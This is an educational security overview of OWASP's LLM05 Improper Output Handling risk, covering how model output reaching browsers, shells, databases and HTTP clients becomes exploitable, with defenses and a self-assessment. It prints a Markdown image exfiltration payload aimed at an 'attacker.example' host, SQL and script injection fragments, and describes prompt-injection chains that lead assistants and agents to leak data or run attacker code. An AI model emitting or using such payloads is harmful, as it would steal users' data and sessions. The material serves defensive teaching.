# LLM05:2025 Improper Output Handling - Overview

## Table of Contents
- [What is Improper Output Handling?](#what-is-improper-output-handling)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Detectability](#prevalence-and-detectability)
- [Common Misunderstandings](#common-misunderstandings)
- [How It Relates to Other LLM Risks](#how-it-relates-to-other-llm-risks)
- [Self-Assessment](#self-assessment)
- [Next Steps](#next-steps)

## What is Improper Output Handling?

**Improper Output Handling** (LLM05 in the 2025 OWASP Top 10 for Large Language Model Applications) is the insufficient validation, sanitization, and encoding of the text a model produces *before* that text is handed to another component. The vulnerability is not in the model and not in what the model "meant" — it is in the code that consumes the model's output and treats it as if it were trusted, well-formed data.

The mental model that makes this category click is a single sentence: **treat every token an LLM emits as untrusted user input.** An attacker who can influence the prompt — directly, or indirectly through a document, web page, email, or tool result the model reads — can influence the output. If that output then flows into a browser, a shell, a SQL query, an HTTP client, a file path, or an `eval()`, the attacker has reached across the model and into your downstream system. In OWASP's framing, this is functionally equivalent to giving end users indirect access to whatever functionality sits behind the model.

> **Naming note:** This entry was called *LLM02: Insecure Output Handling* in the 2023 list and was renumbered and renamed to *LLM05: Improper Output Handling* in the 2025 list. The threat is the same; the guidance below reflects the 2025 edition.

### Input Handling vs. Output Handling

It is easy to confuse this with prompt injection (LLM01). They are two ends of the same pipe:

| Aspect | Prompt Injection (LLM01) | Improper Output Handling (LLM05) |
| --- | --- | --- |
| **Direction** | Untrusted data goes *into* the model | Model output comes *out* and flows downstream |
| **Question** | "Can I make the model do something it shouldn't?" | "What happens when the model's answer reaches my other systems?" |
| **Where the bug lives** | Prompt construction & trust boundaries | The consumer of the output (renderer, shell, DB, HTTP client) |
| **Typical fix** | Separate instructions from data, constrain context | Context-aware encoding, parameterization, sandboxing, schema validation |

The two frequently chain: an indirect prompt injection is the delivery mechanism, and improper output handling is the exploitation mechanism. An attacker plants a payload in a web page; the model summarizes that page; the model's "summary" contains a `<script>` tag; your front end renders it as HTML. The injection got the payload into the answer; the missing output encoding fired it.

## Why Does This Matter?

### Business Impact
- **Account and session compromise**: LLM-driven XSS steals session tokens, performs actions as the victim, and pivots into the rest of the application — often silently, because the malicious content looks like a normal AI answer.
- **Data breach and exfiltration**: Rendered Markdown images and links let a model quietly leak conversation history, secrets, or retrieved documents to an attacker-controlled URL with no click required.
- **Remote code execution and infrastructure takeover**: When output feeds an `exec()`, a shell, or an agent tool, a crafted answer runs attacker code on your servers — the highest-severity outcome in this category.
- **Regulatory and contractual fallout**: Because these bugs move real data and grant real access, they trigger the same GDPR/HIPAA/PCI-DSS breach obligations as any other injection or XSS finding.
- **Erosion of trust in AI features**: A single public "the chatbot ran code / stole my session" incident can force an organization to pull an AI feature entirely.

### Technical Impact
- **Cross-Site Scripting (XSS)**: model output rendered as HTML, Markdown, or JavaScript in a browser.
- **SQL / NoSQL injection**: model output concatenated into a query.
- **OS command injection and RCE**: model output passed to a shell, `eval`, `exec`, deserializer, or template engine.
- **Server-Side Request Forgery (SSRF)**: model-supplied URLs fetched without validation, reaching internal services and cloud metadata endpoints.
- **Path traversal / arbitrary file access**: model output used to build file paths.
- **CSRF and privilege escalation**: model output that triggers state-changing requests or actions the end user was never authorized to perform.

## Technical Context

Every improper-output-handling bug has the same shape. Three conditions must all be true:

```
1. INFLUENCE   The attacker can shape the model's output
               (direct prompt, or indirect via a document/page/email/tool result).

2. FLOW        That output is passed to a downstream "sink" without
               context-appropriate validation, encoding, or parameterization.

3. SINK        The sink interprets structure in the data:
               a browser parses HTML/JS, a DB parses SQL, a shell parses
               metacharacters, an HTTP client dereferences a URL,
               eval() parses code.
```

Remove any one condition and the bug is defused. You usually cannot fully remove condition 1 (models are influenceable by design) so defenders concentrate on condition 2 — the handoff — and on constraining condition 3 (least-privilege, sandboxed sinks).

### The Downstream Sinks That Matter

| Sink | What the model output becomes | Vulnerability if unhandled |
| --- | --- | --- |
| Browser DOM / template | HTML, Markdown, JavaScript | Stored/reflected XSS, HTML injection |
| SQL / NoSQL driver | Part of a query string | SQL / NoSQL injection |
| OS shell / subprocess | A command or argument | Command injection, RCE |
| `eval` / `exec` / deserializer | Executable code or objects | Direct RCE |
| HTTP client | A URL to fetch | SSRF, data exfiltration |
| Filesystem API | A path or filename | Path traversal, overwrite |
| Agent / tool router | An action, API call, or arguments | Unauthorized actions, privilege escalation |
| Email / messaging | Body or recipient of a message | Phishing, spam, header injection |

### Conditions That Amplify the Risk
OWASP calls out several factors that turn a latent flaw into a serious one. Each is worth checking against your own architecture:
- The application grants the LLM **privileges beyond what the end user should have**, enabling escalation or RCE when output is trusted.
- The application is **susceptible to indirect prompt injection**, giving an attacker a reliable way to steer output through content the model ingests.
- **Third-party extensions or plugins** do not independently validate what the model hands them.
- There is **no context-aware output encoding** for the different sinks (HTML vs. JS vs. URL vs. SQL vs. shell).
- The **format or structure of output is not constrained** — free-form text is accepted where a strict schema or enum should be required.
- **Monitoring and rate limiting are absent**, so anomalous output that triggers downstream actions goes unnoticed.

## Real-World Impact

The incidents below are described as **classes of publicly documented issues**, not as citations of specific vendors or CVE numbers. They are the patterns you will actually meet in the wild.

### Class 1: Markdown Image / Link Data Exfiltration
**Pattern**: A chat assistant renders Markdown returned by the model. An attacker uses (usually indirect) prompt injection to make the model emit an image such as `![x](https://attacker.example/log?d=SECRET)`. The browser automatically fetches the image URL, and any data the model was tricked into placing in the query string is delivered to the attacker — **zero clicks required**.

**Why it recurs**: Markdown rendering feels like "just formatting," so teams enable it without a URL allowlist or a Content Security Policy. Multiple mainstream AI chat products have shipped and later patched exactly this. The durable fix is to restrict which URL schemes and hosts may be auto-loaded and to apply a strict CSP.

### Class 2: Prompt-Injection-to-XSS in AI Answers
**Pattern**: A RAG assistant or "summarize this page" feature ingests attacker-controlled content, the model reproduces embedded HTML/JavaScript, and the front end renders the answer with `innerHTML` or an unsanitized Markdown-to-HTML step. The result is stored or reflected XSS that runs in the victim's authenticated session.

**Why it recurs**: The output "came from our own AI," so it is implicitly trusted — yet its content is fully attacker-influenced. The fix is to encode for the HTML context and sanitize Markdown with a strict allowlist.

### Class 3: Code-Execution Chains in LLM Orchestration Frameworks
**Pattern**: Early versions of several LLM "chain" and agent frameworks shipped features that took a model-produced expression or snippet and ran it through Python's `eval`/`exec` (for example, math or "program-aided" reasoning chains, or a Python REPL tool). Because the expression is model-controlled, a crafted prompt produced arbitrary code execution on the host.

**Why it recurs**: "Let the model write a little code and run it" is a tempting shortcut. Multiple such features received security advisories and were subsequently sandboxed, gated behind explicit opt-in, or removed. The lesson: never evaluate model output as code outside a strong sandbox.

### Class 4: Agent Tool Abuse via Unconstrained Output
**Pattern**: An autonomous agent parses model output to decide which tool to call and with what arguments. When the output format is free-form and the tool set is powerful (shell, file write, HTTP, database), a manipulated answer causes the agent to perform actions the user never authorized — deleting data, calling internal APIs, or exfiltrating files.

**Why it recurs**: Agent frameworks optimize for capability first. The fix is strict schema-constrained tool arguments, an allowlist of permitted actions, human-in-the-loop for high-impact operations, and least-privilege credentials for every tool.

## Prevalence and Detectability

Improper Output Handling is one of the most common findings in LLM application assessments, for a structural reason: teams port classic input-validation discipline to the prompt but forget that **the model's reply is a second untrusted boundary**. Anywhere a pre-AI application would have encoded, parameterized, or sandboxed user input, an AI application must do the same to model output — and often does not.

Rather than cite precise counts, the defensible picture is:
- The flaw is **highly prevalent** because almost every LLM feature has at least one downstream sink, and the "it's our own AI" bias suppresses scrutiny.
- It is **moderately easy to detect**: the same tooling that finds XSS, SQLi, SSRF, and command injection finds it, once you treat model output as a source.
- Impact ranges from **information disclosure up to full remote code execution**, depending entirely on the privilege of the sink.

> Treat any single statistic you read about "percentage of LLM apps affected" as illustrative. The durable takeaway is that this is common, findable with existing appsec tooling, and cheap to exploit once an attacker can influence output.

## Common Misunderstandings

### Myth 1: "The output came from our own model, so it's trusted."
**Reality**: The model's output is a function of its input, and its input includes attacker-influenceable content. Provenance ("our AI said it") is not the same as integrity. Trust the boundary, not the brand.

### Myth 2: "We validate the user's prompt, so the output is safe."
**Reality**: Input validation reduces some prompt injection but cannot guarantee safe output, especially with indirect injection through retrieved documents. Output handling is a *separate* control that must exist regardless of how good your input filtering is.

### Myth 3: "A guardrail model / moderation filter will catch dangerous output."
**Reality**: Guardrails are probabilistic and target harmful *meaning*, not *syntax*. A perfectly benign-looking sentence can still contain `</script>`, a SQL quote, or a shell metacharacter. Deterministic encoding/parameterization at the sink is what actually stops the exploit.

### Myth 4: "We render Markdown, not HTML, so XSS isn't possible."
**Reality**: Most Markdown renderers pass through raw HTML and support `javascript:`-style links and auto-loading images unless explicitly configured not to. Markdown is an XSS and exfiltration surface until you sanitize it.

### Myth 5: "Structured output (JSON mode) makes handling safe."
**Reality**: JSON mode constrains *shape*, not *values*. A field can still contain `<script>` or `'; DROP TABLE`. You still must validate values against a strict schema and encode them for their eventual sink.

### Myth 6: "It's just a chatbot; there's no dangerous sink."
**Reality**: The browser *is* a dangerous sink. Rendering an answer is enough for XSS and Markdown exfiltration. And chatbots grow tools, plugins, and agent actions over time — today's harmless display becomes tomorrow's command executor.

## How It Relates to Other LLM Risks
- **LLM01 Prompt Injection**: the usual *cause* of malicious output. Injection gets the payload into the answer; improper output handling lets it fire. Defend both ends.
- **LLM06 Excessive Agency**: raises the *impact*. The more power a downstream tool has, the worse an unhandled output becomes. Least-privilege tools shrink the blast radius.
- **LLM02 Sensitive Information Disclosure**: unhandled output is a common exfiltration channel (e.g., Markdown-image leaks).
- **LLM08 Vector/Embedding Weaknesses**: poisoned retrieval feeds attacker content into the model, which then emerges as dangerous output.

## Self-Assessment
Ask these questions about every place your application consumes model output:
- Do we treat model output as untrusted input everywhere it crosses into another component?
- Is output **context-encoded** for its exact sink (HTML body, HTML attribute, JS, URL, CSS, SQL, shell)?
- Do we **never** pass output to `eval`/`exec`/`os.system`/deserializers, and sandbox any legitimate code execution?
- Are all database calls **parameterized**, with model output as bound values only?
- Is rendered Markdown/HTML run through a **strict sanitizer** and served under a restrictive **Content-Security-Policy**?
- Are model-supplied URLs checked against an **allowlist** before any fetch (SSRF defense)?
- Do agent/tool actions require **schema-validated arguments** and an **allowlist**, with least-privilege credentials and human approval for high-impact actions?
- Do we **log and monitor** output that triggers downstream side effects?

Several "no" or "not sure" answers mean you likely have an exploitable output-handling gap today.

## Next Steps
- **[Attack Vectors](attack-vectors.html)**: the flow and the concrete exploitation patterns.
- **[Prevention](prevention.html)**: layered defenses with code and configuration.
- **[Examples](examples.html)**: vulnerable vs. secure code in Python and Node/TypeScript, plus front-end sinks.
- **[Hands-On Lab](./lab/improper-output-handling/)**: exploit and then fix an improper-output-handling flaw.
